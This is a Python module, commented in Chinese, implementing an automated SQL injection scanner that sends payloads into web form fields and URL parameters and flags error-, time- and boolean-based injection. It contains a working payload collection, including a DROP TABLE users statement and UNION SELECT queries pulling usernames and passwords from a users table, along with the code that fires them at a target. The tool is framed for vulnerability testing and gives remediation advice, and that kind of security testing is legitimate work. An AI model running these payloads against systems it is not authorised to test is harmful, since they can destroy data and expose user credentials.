#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
SQL注入扫描器模块，负责扫描SQL注入漏洞
"""

import re
import logging
import time
import random
from difflib import SequenceMatcher
from urllib.parse import urlparse, urlencode, parse_qsl

logger = logging.getLogger('xss_scanner')

class SQLInjectionScanner:
    """SQL注入扫描器类，负责扫描SQL注入漏洞"""
    
    def __init__(self, http_client):
        """
        初始化SQL注入扫描器
        
        Args:
            http_client: HTTP客户端对象
        """
        self.http_client = http_client
        
        # 基本的SQL注入Payload
        self.payloads = {
            'error_based': [
                "'",
                "\"",
                "')",
                "'))",
                "\")",
                "\"))",
                "';",
                "\";",
                "')) OR 1=1--",
                "')); OR 1=1--",
                "')) OR '1'='1'--",
                "')) OR '1'='1'#",
                "' OR '1'='1'--",
                "' OR '1'='1' --",
                "' OR '1'='1'#",
                "' OR '1'='1' #",
                "' OR 1=1--",
                "' OR 1=1 --",
                "\" OR 1=1--",
                "\" OR 1=1 --"
            ],
            'time_based': [
                "' OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "') OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "\" OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "\") OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "';WAITFOR DELAY '0:0:3'--",
                "');WAITFOR DELAY '0:0:3'--",
                "\";WAITFOR DELAY '0:0:3'--",
                "\");WAITFOR DELAY '0:0:3'--",
                "' OR pg_sleep(3)--",
                "') OR pg_sleep(3)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "') AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "\" AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "\") AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
            ],
            'union_based': [
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT username,password,3,4 FROM users--",
                "' UNION ALL SELECT 1,2,3,4--",
                "' UNION ALL SELECT 1,2,3,4,5--",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT username,password,3,4 FROM users--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' OR 1=2--",
                "') AND 1=1--",
                "') AND 1=2--",
                "') OR 1=1--",
                "') OR 1=2--"
            ],
            # 专门针对Email字段的SQL注入有效载荷
            'email_specific': [
                "test@test.com' OR 1=1--",
                "test@test.com') OR 1=1--",
                "test@test.com')) OR 1=1--",
                "test@test.com'))) OR 1=1--",
                "test@test.com'; DROP TABLE users--",
                "test@test.com')) UNION SELECT username,password,3,4 FROM users--",
                "test'+'@example.com",
                "test@example.com' AND (SELECT 4821 FROM (SELECT(SLEEP(3)))test)--",
                "test@example.com' OR EXISTS(SELECT * FROM users)--",
                "test@example.com' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
                "test@example.com' UNION SELECT username,password FROM users--",
                "admin'--@example.com",
                "' UNION SELECT @@version,2#@example.com",
                "admin'/**/OR/**/1=1#@example.com",
                "test@example.com' AND 'x'='x",
                "test@example.com' AND SLEEP(3)#",
                "'; DECLARE @v nvarchar(max), @q nvarchar(max); SET @v = 'admin@example.com'; SET @q = 'SELECT * FROM Users WHERE email='''+@v+''''; EXEC(@q)--@test.com"
            ]
        }
        
        # SQL错误特征
        self.sql_errors = [
            "SQL syntax.*?MySQL", "Warning.*?mysqli", "MySQLSyntaxErrorException",
            "valid MySQL result", "check the manual that corresponds to your (MySQL|MariaDB) server version",
            "MySqlClient\\.", "com\\.mysql\\.jdbc", "Zend_Db_(Adapter|Statement)_Mysqli_Exception",
            "SQLSTATE\\[\\d+\\]: Syntax error or access violation", "Uncaught mysqli_sql_exception",
            
            "ORA-[0-9][0-9][0-9][0-9]", "Oracle error", "Oracle.*?Driver", "Warning.*?oci_.*", "OracleConnection",
            "quoted string not properly terminated", "ORA-00936: missing expression",
            
            "Microsoft SQL Server", "MSSQL.*?Driver", "MSSQL.*?Exception", "Msg \\d+, Level \\d+, State \\d+",
            "Unclosed quotation mark after the character string", "Incorrect syntax near",
            
            "PostgreSQL.*?ERROR", "Warning.*?Pg_.*", "valid PostgreSQL result", "PgSqlException",
            "PSQLException", "org\\.postgresql\\.util\\.PSQLException",
            
            "CLI Driver.*?DB2", "DB2 SQL error", "db2_\\w+\\(",
            
            "SQLite3::query", "SQLite3Result", "SQLitException",
            
            "Warning.*?sqlite_.*?", "Warning.*?PDO::.*?",
            
            "HY000", "Dynamic SQL Error", "System\\.Data\\.SqlClient\\.SqlException", 
            "Exception.*?Sybase.*?", "Sybase message", "Sybase.*?Server message"
        ]
    
    def scan_form(self, url, form, field):
        """
        扫描表单中的SQL注入漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        logger.debug(f"扫描SQL注入: {field.get('name')} @ {url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 构建基准表单数据，用于比较
        base_form_data = {}
        for f in form.get('fields', []):
            if f.get('name'):
                # 对于目标字段使用无害值
                if f['name'] == field['name']:
                    # 根据字段类型选择适当的测试值
                    if field.get('type') == 'email' or 'email' in field.get('name', '').lower():
                        base_form_data[f['name']] = 'test@example.com'
                    else:
                        base_form_data[f['name']] = 'test123'
                else:
                    base_form_data[f['name']] = f.get('value', '')
        
        # 发送基准请求
        if method == 'POST':
            base_response = self.http_client.post(action_url, data=base_form_data)
        else:
            base_response = self.http_client.get(action_url, params=base_form_data)
            
        if not base_response:
            return None
            
        # 检查字段是否为email类型或名称包含email
        is_email_field = field.get('type') == 'email' or 'email' in field.get('name', '').lower()
        
        # 测试基于错误的SQL注入
        payloads_to_test = self.payloads['error_based']
        
        # 如果是email字段，优先使用email特定的有效载荷
        if is_email_field:
            logger.info(f"检测到Email字段: {field.get('name')}，使用特定的SQL注入测试")
            payloads_to_test = self.payloads['email_specific'] + payloads_to_test
            
        for payload in payloads_to_test:
            # 构建注入表单数据
            inject_form_data = base_form_data.copy()
            inject_form_data[field['name']] = payload
            
            # 发送注入请求
            if method == 'POST':
                inject_response = self.http_client.post(action_url, data=inject_form_data)
            else:
                inject_response = self.http_client.get(action_url, params=inject_form_data)
                
            if not inject_response:
                continue
                
            # 检查是否有SQL错误
            if self._check_sql_errors(inject_response.text):
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Error-based SQL Injection',
                    'url': url,
                    'form_action': action_url,
                    'form_method': method,
                    'parameter': field['name'],
                    'payload': payload,
                    'severity': '高',
                    'description': f"在表单字段'{field['name']}'中发现基于错误的SQL注入漏洞",
                    'details': {
                        "漏洞位置": f"表单提交到{action_url}的{field['name']}字段",
                        "漏洞类型": "基于错误的SQL注入",
                        "有效载荷": payload,
                        "风险": "攻击者可能能够执行任意SQL查询，访问或修改数据库内容"
                    },
                    'recommendation': "使用参数化查询或预处理语句，对用户输入进行严格过滤，限制数据库账户权限"
                }
        
        # 测试基于时间的SQL注入
        for payload in self.payloads['time_based']:
            # 构建注入表单数据
            inject_form_data = base_form_data.copy()
            inject_form_data[field['name']] = payload
            
            # 记录开始时间
            start_time = time.time()
            
            # 发送注入请求
            if method == 'POST':
                inject_response = self.http_client.post(action_url, data=inject_form_data)
            else:
                inject_response = self.http_client.get(action_url, params=inject_form_data)
                
            # 计算响应时间
            response_time = time.time() - start_time
            
            # 如果响应时间超过了预期的延迟时间（考虑网络延迟），则可能存在时间盲注
            if response_time > 2.5:  # 考虑到网络延迟，使用略小于3秒的阈值
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Time-based SQL Injection',
                    'url': url,
                    'form_action': action_url,
                    'form_method': method,
                    'parameter': field['name'],
                    'payload': payload,
                    'severity': '高',
                    'description': f"在表单字段'{field['name']}'中发现基于时间的SQL注入漏洞",
                    'details': f"表单提交到{action_url}的{field['name']}字段存在基于时间的SQL注入漏洞，响应时间为{response_time:.2f}秒",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
        
        # 测试基于布尔的SQL注入
        boolean_results = {}
        for payload in self.payloads['boolean_based']:
            # 构建注入表单数据
            inject_form_data = base_form_data.copy()
            inject_form_data[field['name']] = payload
            
            # 发送注入请求
            if method == 'POST':
                inject_response = self.http_client.post(action_url, data=inject_form_data)
            else:
                inject_response = self.http_client.get(action_url, params=inject_form_data)
                
            if not inject_response:
                continue
                
            # 记录响应内容和长度
            response_content = inject_response.text if hasattr(inject_response, 'text') else ''
            response_length = len(response_content)
            
            # 提取payload的逻辑部分，如1=1或1=2
            if "1=1" in payload or "'1'='1'" in payload or "\"1\"=\"1\"" in payload:
                logic_type = 'TRUE'
            else:
                logic_type = 'FALSE'
                
            # 记录结果
            if logic_type not in boolean_results:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
            elif logic_type == 'TRUE' and response_length > boolean_results[logic_type]['length']:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
            elif logic_type == 'FALSE' and response_length < boolean_results[logic_type]['length']:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
        
        # 如果收集到了两种逻辑的结果，比较它们
        if 'TRUE' in boolean_results and 'FALSE' in boolean_results:
            true_length = boolean_results['TRUE']['length']
            false_length = boolean_results['FALSE']['length']
            
            # 如果长度差异明显，则可能存在布尔盲注
            if abs(true_length - false_length) > 10:
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Boolean-based SQL Injection',
                    'url': url,
                    'form_action': action_url,
                    'form_method': method,
                    'parameter': field['name'],
                    'payload': boolean_results['TRUE']['payload'],
                    'severity': '高',
                    'description': f"在表单字段'{field['name']}'中发现基于布尔的SQL注入漏洞",
                    'details': f"表单提交到{action_url}的{field['name']}字段存在布尔盲注漏洞，TRUE条件下响应长度为{true_length}，FALSE条件下响应长度为{false_length}",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
            
            # 如果内容差异明显，则可能存在布尔盲注
            true_content = boolean_results['TRUE']['content']
            false_content = boolean_results['FALSE']['content']
            similarity = SequenceMatcher(None, true_content, false_content).ratio()
            
            if similarity < 0.9:  # 相似度低于90%
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Boolean-based SQL Injection',
                    'url': url,
                    'form_action': action_url,
                    'form_method': method,
                    'parameter': field['name'],
                    'payload': boolean_results['TRUE']['payload'],
                    'severity': '高',
                    'description': f"在表单字段'{field['name']}'中发现基于布尔的SQL注入漏洞",
                    'details': f"表单提交到{action_url}的{field['name']}字段存在布尔盲注漏洞，TRUE和FALSE条件下的响应内容相似度为{similarity:.2f}",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
                
        return None
    
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的SQL注入漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        logger.debug(f"扫描SQL注入参数: {param} @ {url}")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 解析查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不在查询字符串中，则跳过
        if param not in query_params:
            return None
            
        # 获取参数原始值
        original_value = query_params[param]
        
        # 检查参数是否可能是email
        is_email_param = 'email' in param.lower() or (original_value and '@' in original_value and '.' in original_value.split('@')[1])
        
        # 构建基准URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 发送基准请求
        base_response = self.http_client.get(url)
        
        if not base_response:
            return None
            
        # 测试基于错误的SQL注入
        payloads_to_test = self.payloads['error_based']
        
        # 如果是email参数，使用email特定的有效载荷
        if is_email_param:
            logger.info(f"检测到Email参数: {param}，使用特定的SQL注入测试")
            payloads_to_test = self.payloads['email_specific'] + payloads_to_test
        
        for payload in payloads_to_test:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 构建注入URL
            inject_url = f"{base_url}?{urlencode(inject_params)}"
            
            # 发送注入请求
            inject_response = self.http_client.get(inject_url)
            
            if not inject_response:
                continue
                
            # 检查是否有SQL错误
            if self._check_sql_errors(inject_response.text):
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Error-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'severity': '高',
                    'description': f"在URL参数'{param}'中发现基于错误的SQL注入漏洞",
                    'details': {
                        "漏洞位置": f"URL参数{param}",
                        "漏洞类型": "基于错误的SQL注入",
                        "有效载荷": payload,
                        "风险": "攻击者可能能够执行任意SQL查询，访问或修改数据库内容"
                    },
                    'recommendation': "使用参数化查询或预处理语句，对用户输入进行严格过滤，限制数据库账户权限"
                }
        
        # 测试基于时间的SQL注入
        for payload in self.payloads['time_based']:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 构建注入URL
            inject_url = f"{base_url}?{urlencode(inject_params)}"
            
            # 记录开始时间
            start_time = time.time()
            
            # 发送注入请求
            inject_response = self.http_client.get(inject_url)
            
            # 计算响应时间
            response_time = time.time() - start_time
            
            # 如果响应时间超过了预期的延迟时间（考虑网络延迟），则可能存在时间盲注
            if response_time > 2.5:  # 考虑到网络延迟，使用略小于3秒的阈值
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Time-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'severity': '高',
                    'description': f"在URL参数'{param}'中发现基于时间的SQL注入漏洞",
                    'details': f"URL参数{param}存在基于时间的SQL注入漏洞，响应时间为{response_time:.2f}秒",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
        
        # 测试基于布尔的SQL注入
        boolean_results = {}
        for payload in self.payloads['boolean_based']:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 构建注入URL
            inject_url = f"{base_url}?{urlencode(inject_params)}"
            
            # 发送注入请求
            inject_response = self.http_client.get(inject_url)
            
            if not inject_response:
                continue
                
            # 记录响应内容和长度
            response_content = inject_response.text if hasattr(inject_response, 'text') else ''
            response_length = len(response_content)
            
            # 提取payload的逻辑部分，如1=1或1=2
            if "1=1" in payload or "'1'='1'" in payload or "\"1\"=\"1\"" in payload:
                logic_type = 'TRUE'
            else:
                logic_type = 'FALSE'
                
            # 记录结果
            if logic_type not in boolean_results:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
            elif logic_type == 'TRUE' and response_length > boolean_results[logic_type]['length']:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
            elif logic_type == 'FALSE' and response_length < boolean_results[logic_type]['length']:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
        
        # 如果收集到了两种逻辑的结果，比较它们
        if 'TRUE' in boolean_results and 'FALSE' in boolean_results:
            true_length = boolean_results['TRUE']['length']
            false_length = boolean_results['FALSE']['length']
            
            # 如果长度差异明显，则可能存在布尔盲注
            if abs(true_length - false_length) > 10:
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Boolean-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': boolean_results['TRUE']['payload'],
                    'severity': '高',
                    'description': f"在URL参数'{param}'中发现基于布尔的SQL注入漏洞",
                    'details': f"URL参数{param}存在布尔盲注漏洞，TRUE条件下响应长度为{true_length}，FALSE条件下响应长度为{false_length}",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
            
            # 如果内容差异明显，则可能存在布尔盲注
            true_content = boolean_results['TRUE']['content']
            false_content = boolean_results['FALSE']['content']
            similarity = SequenceMatcher(None, true_content, false_content).ratio()
            
            if similarity < 0.9:  # 相似度低于90%
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Boolean-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': boolean_results['TRUE']['payload'],
                    'severity': '高',
                    'description': f"在URL参数'{param}'中发现基于布尔的SQL注入漏洞",
                    'details': f"URL参数{param}存在布尔盲注漏洞，TRUE和FALSE条件下的响应内容相似度为{similarity:.2f}",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
                
        return None
    
    def _check_sql_errors(self, content):
        """
        检查响应内容是否包含SQL错误
        
        Args:
            content: 响应内容
            
        Returns:
            bool: 是否包含SQL错误
        """
        error_patterns = [
            # MySQL
            "You have an error in your SQL syntax",
            "Warning: mysql_",
            "MySQL Error",
            "MySQL ODBC",
            "MySQL Driver",
            "mysqli_",
            "mysqli.query",
            "Unclosed quotation mark after the character string",
            "SQL syntax.*?MySQL",
            "Warning.*?mysqli",
            
            # PostgreSQL
            "PostgreSQL.*?ERROR",
            "Warning.*?\\Wpg_",
            "valid PostgreSQL result",
            "PostgreSQL query failed",
            "org.postgresql.util.PSQLException",
            
            # Microsoft SQL Server
            "Microsoft SQL Server",
            "ODBC SQL Server Driver",
            "ODBC Driver.*?SQL Server",
            "SQLServer JDBC Driver",
            "SqlException",
            "Unclosed quotation mark after the character string",
            "mssql_query()",
            "System\\.Data\\.SqlClient\\.",
            "Exception.*?\\WSystem.Data.SqlClient.",
            "Exception.*?\\WServer.SqlException",
            
            # Oracle
            "ORA-[0-9][0-9][0-9][0-9]",
            "Oracle error",
            "Oracle.*?Driver",
            "Warning.*?\\Woci_",
            "Oracle.*?Database",
            
            # SQLite
            "SQLite/JDBCDriver",
            "SQLite\\.Exception",
            "System\\.Data\\.SQLite\\.SQLiteException",
            "Warning.*?sqlite_",
            
            # 通用模式
            "SQL syntax.*?error",
            "Incorrect syntax near",
            "Syntax error.*?in query expression",
            "Unexpected end of command in statement",
            "Unexpected token.*?in statement",
            "SQL ERROR",
            "SQL Error",
            "SQLSTATE",
            "\\[SQL Server\\]",
            "ODBC Driver",
            "syntax error",
            "Division by zero",
            "Unable to connect to database",
            "Database error",
            "DB Error",
            "query failed",
            "Unable to execute query",
            "Invalid SQL",
            "Database connection error",
            "SQL command.*?not properly ended",
            "Malformed query",
            "Object reference not set to an instance",
            "DatabaseException",
            "DBD::mysql::st",
            "SQL STATE",
            "JDBC Driver",
            "java.sql.SQLException",
            "JSQLConnect",
            "JET Database Engine",
            "Access Database Engine",
            "Driver.*?SQL",
            "Invalid column name",
            "Column.*?not found",
            "Table.*?not found",
            "expects parameter",
            "Data type mismatch",
            "expects parameter",
            "Internal Server Error",
            "Server Error in.*?Application",
            "CLI Driver",
            "ADODB",
            "ADOConnection",
            "MySQLSyntaxErrorException",
            "SqliteException",
            "InvalidSqlException",
            "SQL statement was not properly terminated"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
                
        return False
    
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
    
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True 